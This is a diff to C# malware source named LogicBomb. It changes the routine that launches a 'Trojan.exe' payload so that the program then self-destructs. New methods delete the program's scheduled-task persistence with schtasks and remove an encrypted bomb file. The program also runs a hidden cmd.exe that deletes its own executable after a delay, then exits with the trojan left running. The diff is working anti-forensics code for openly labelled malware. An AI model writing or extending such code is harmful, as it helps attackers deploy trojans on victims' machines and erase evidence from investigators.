@@ -246,7 +246,7 @@ namespace LogicBomb
                 if (executableToRun != null)
                 {
                     Console.WriteLine("[LogicBomb] Launching: " + executableToRun);
-                    LogEvent("final", executableToRun, "about_to_exit", "payload launched successfully");
+                    LogEvent("final", executableToRun, "about_to_launch", "payload launching");
 
                     var psi = new ProcessStartInfo
                     {
@@ -260,8 +260,10 @@ namespace LogicBomb
                     {
                         Process.Start(psi);
                         LogEvent("launched", executableToRun, "launched", null);
-                        Console.WriteLine("[LogicBomb] Trojan.exe started. Exiting LogicBomb.");
-                        Environment.Exit(0);
+                        Console.WriteLine("[LogicBomb] Trojan.exe started.");
+
+                        // Cleanup and self-destruct
+                        CleanupAndExit();
                     }
                     catch (Exception ex)
                     {
@@ -278,6 +280,91 @@ namespace LogicBomb
             {
                 Console.WriteLine("[LogicBomb] TriggerPayload error: " + ex.Message);
                 LogEvent("error", "trigger_payload", "exception", ex.Message);
+            }
+        }
+
+        private static void CleanupAndExit()
+        {
+            try
+            {
+                LogEvent("cleanup", "self", "starting_cleanup", "self-destruct initiated");
+                Console.WriteLine("[LogicBomb] Starting self-destruct sequence...");
+
+                // Delete scheduled task
+                DeleteScheduledTask(LOGICBOMB_TASK_NAME);
+
+                // Delete bomb.encrypted
+                string bombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
+                if (File.Exists(bombPath))
+                {
+                    File.Delete(bombPath);
+                    Console.WriteLine("[LogicBomb] Deleted bomb.encrypted");
+                    LogEvent("cleanup", bombPath, "deleted", "encrypted payload removed");
+                }
+
+                // Delete self (LogicBomb.exe) using cmd delayed deletion
+                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = $"/C timeout /T 2 /NOBREAK > nul & del /F /Q \"{selfPath}\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+
+                Process.Start(psi);
+                Console.WriteLine("[LogicBomb] Self-deletion scheduled");
+                LogEvent("cleanup", selfPath, "self_delete_scheduled", "LogicBomb will be deleted in 2 seconds");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[LogicBomb] Cleanup error: " + ex.Message);
+                LogEvent("error", "cleanup", "failed", ex.Message);
+            }
+
+            Console.WriteLine("[LogicBomb] Exiting now. Trojan is running.");
+            Environment.Exit(0);
+        }
+
+        private static void DeleteScheduledTask(string taskName)
+        {
+            try
+            {
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "schtasks.exe",
+                    Arguments = $"/Delete /TN \"{taskName}\" /F",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+
+                using (Process process = Process.Start(psi))
+                {
+                    string output = process.StandardOutput.ReadToEnd();
+                    string error = process.StandardError.ReadToEnd();
+                    process.WaitForExit();
+
+                    if (process.ExitCode == 0)
+                    {
+                        Console.WriteLine($"[LogicBomb] Deleted scheduled task: {taskName}");
+                        LogEvent("cleanup", taskName, "task_deleted", "persistence removed");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"[LogicBomb] Failed to delete task: {error}");
+                        LogEvent("cleanup", taskName, "task_delete_failed", error);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[LogicBomb] Error deleting task: {ex.Message}");
+                LogEvent("error", taskName, "task_delete_exception", ex.Message);
             }
         }
 
